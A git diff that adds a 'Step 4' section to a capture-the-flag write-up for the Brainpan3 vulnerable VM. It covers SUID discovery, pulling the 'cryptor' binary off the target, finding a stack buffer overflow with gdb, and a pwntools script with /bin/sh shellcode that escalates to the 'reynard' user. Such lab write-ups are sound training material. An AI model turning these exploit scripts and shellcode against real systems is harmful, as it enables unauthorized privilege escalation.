@@ -172,7 +172,7 @@ SELECTED: 2
 CODE REPOSITORY IS ALREADY ENABLED
 ```
 
-Turning on the code repo enabled a web service on port 8080, which also has a `/repo` directory containing the binaries used during this step:
+Turning on the code repo enables a web service on port 8080, which also has a `/repo` directory containing the binaries used during this step:
 
 ![Web service](repo-directory.png)
 
@@ -243,7 +243,7 @@ b77a3ac0.59.4e.59.b77a38a0.b77a3000.b77a3ac0.
 
 The `Y, N, Y` looks very similar to the `Y, N, Y` of the dialog shown from the command menu. Let's grab where in the format string the `4e` is in order to know how much to overflow.
 
-```
+```python
 # Update Session name
 r.sendline('3')
 
@@ -367,7 +367,7 @@ anansi@brainpan3:/$
 
 And we have a user shell! As normal, let's modify our exploit script to retrieve a shell for us automagically:
 
-```
+```python
 ###
 # Get user shell
 ###
@@ -389,4 +389,242 @@ r.interactive()
 ```
 
 ## Step 4
+
+Time to begin basic recon of the `anansi` shell:
+
+```
+anansi@brainpan3:/$ $ whoami
+anansi
+
+anansi@brainpan3:/$ $ uname -a
+Linux brainpan3 3.16.0-41-generic #55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux
+
+anansi@brainpan3:/$ $ id
+uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
+```
+
+Assuming we need to do some sort of privilege escalation, let's look for SUID binaries:
+
+```
+anansi@brainpan3:/$ $ find / -perm -u=s -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+/usr/sbin/pppd
+/usr/sbin/uuidd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/pt_chown
+/usr/lib/eject/dmcrypt-get-device
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/mtr
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/sudo
+/home/reynard/private/cryptor
+/bin/su
+/bin/ping
+/bin/fusermount
+/bin/mount
+/bin/umount
+/bin/ping6
+```
+
+The binary that sticks out here is `/home/reynard/private/cryptor`. Can we execute this binary?
+
+```
+anansi@brainpan3:/home/anansi$ $ /home/reynard/private/cryptor
+/home/reynard/private/cryptor
+Usage: /home/reynard/private/cryptor file key
+```
+
+So we can execute the `cryptor` binary. Let's try to look at this binary:
+
+```
+anansi@brainpan3:/$ $ cd ~
+cd ~
+anansi@brainpan3:/home/anansi$ $ cp /home/reynard/private/cryptor .
+cp /home/reynard/private/cryptor .
+anansi@brainpan3:/home/anansi$ $ ls -la
+```
+
+Let's pull this binary off Brainpan3 and onto our local machine:
+
+```
+anansi@brainpan3:/home/anansi$ $ python -m SimpleHTTPServer 8080
+python -m SimpleHTTPServer 8080
+```
+
+On our host:
+
+```
+wget http://192.168.224.154:8080/cryptor
+```
+
+And now we have our binary:
+
+```
+192.168.224.156 - - [10/Sep/2015 06:36:19] "GET / HTTP/1.1" 200 -
+192.168.224.156 - - [10/Sep/2015 06:36:25] "GET /cryptor HTTP/1.1" 200 -
+```
+
+Quick sanity check for the `cryptor` binary:
+```
+ctf@ctf-barberpole:~/ctfs/brainpan3/files$ checksec cryptor 
+[*] '/home/ctf/ctfs/brainpan3/files/cryptor'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE
+```
+
+Awesome, no canary and no NX. This means, assuming we can find a buffer overflow. We can jump back to our shellcode and execute our payload from there, avoiding ROP or other shenanigans.
+
+Looking at the binary in IDA, we can see a buffer overflow condition. We see a buffer that is allocated 100 bytes.
+
+![Buffer Overflow 1](cryptor-buff1.png)
+
+There is then a check if the first argument (argv[1]) is less than or equal to 116 bytes.
+
+![Buffer Overflow 2](cryptor-buff2.png)
+
+Here we are given the situation of writing 116 bytes into a 100 byte buffer, potentially causing an overflow. With this knowledge, let's test it dynamically.
+
+Open `gdb ./cryptor` with [https://github.com/zachriggle/pwndbg](Pwndbg) enabled and throw a 116 byte string at crytor with a junk second string.
+
+Create the 116 byte string using [https://github.com/binjitsu/binjitsu/](Binjitsu).
+
+```
+>>> from pwn import *
+>>> cyclic(116)
+'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab'
+```
+
+Run the binary with our 116 byte string.
+
+```
+Loaded 53 commands.  Type pwndbg for a list.
+Reading symbols from ./cryptor...(no debugging symbols found)...done.
+Only available when running
+pwn> r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab zzzz
+```
+
+Watch as we get a fancy crash
+
+```
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[----------REGISTERS----------]
+ EAX  0x0
+ EBX  0x62616164 ('daab')
+ ECX  0x0
+ EDX  0x0
+ EDI  0x636e652e ('.enc')
+ ESI  0x0
+ EBP  0x61616179 ('yaaa')
+ ESP  0xffffcb08 <-- 'baab'
+ EIP  0x6261617a ('zaab')
+[----------BACKTRACE----------]
+>  f 0 6261617a
+   f 1 62616162
+   f 2        0
+Program received signal SIGSEGV
+```
+
+Awesome, so we have a crash at offset `zaab` in our `cyclic` string. Let's create another cyclic string replacing the `zaab` to know that we have surgical control of EIP.
+
+```
+>>> shellcode = 'A' * cyclic_find('zaab') + 'BBBB'
+>>> shellcode += 'C' * (116 - len(shellcode))
+>>> print shellcode
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCC
+```
+
+```
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+[-------------------------------------REGISTERS-------------------------------------]
+*EAX  0x0
+*EBX  0x43434343 ('CCCC')
+*ECX  0x0
+*EDX  0x0
+*EDI  0x636e652e ('.enc')
+*ESI  0x0
+*EBP  0x41414141 ('AAAA')
+*ESP  0xffffcb08 <-- 'CCCC'
+*EIP  0x42424242 ('BBBB')
+[-------------------------------------BACKTRACE-------------------------------------]
+>  f 0 42424242
+>  f 1 43434343
+>  f 2        0
+>   Program received signal SIGSEGV
+```
+
+We also notice that the second argument is stored in a global array found at `0x804a080`. If we dump shellcode in that 
+
+Our plan of attack here is as follows:
+
+* Overwrite the return address `BBBB` with `0x804a080`
+* Drop `/bin/sh` shellcode in the second argument in order to gain a shell
+
+Our resulting testing script is below:
+
+```
+from pwn import * # pip install --upgrade git+https://github.com/binjitsu/binjitsu.git
+
+shellcode = 'A' * cyclic_find('zaab') + p32(0x804a080)
+shellcode += 'C' * (116 - len(shellcode))
+
+r = process(['./cryptor', shellcode, asm(shellcraft.sh())])
+
+r.interactive()
+```
+
+Now we have to execute this command on the server. In order to do this, we create the command in the script, then send the command from the script. The process is shown below:
+
+```python
+offset = cyclic_find('zaab')
+buffer = 116 - len(shellcode)
+
+# Yay easy /bin/sh shells
+binsh_shellcode = asm(shellcraft.sh())
+
+# Build argv1
+argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)
+
+# Build argv2
+argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))
+
+# Final command
+actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)
+
+log.info(actual_shellcode)
+
+# Sometimes the command didn't work. This will repeat throwing the command until we get a reynard shell
+r.sendline('cd /home/reynard/private')
+while True:
+    r.clean()
+    r.sendline(actual_shellcode)
+    r.clean()
+    r.sendline('id')
+    output = r.recv()
+    if 'reynard' in output:
+        break
+
+log.info("Shell recevied: reynard")
+
+r.interactive()
+```
+
+And we are given our reynard shell!
+
+```
+[*] ./cryptor $(python -c 'print "A" * 100 + "\x80\xa0\x04\x08" + "C" * 12') $(python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x6a\x0b\x58\x89\xe3\x31\xc9\x99\xcd\x80"')
+[*] Shell recevied: reynard
+[*] Switching to interactive mode
+uid=1000(anansi) gid=1003(webdev) euid=1002(reynard) groups=1002(reynard)
+```
 
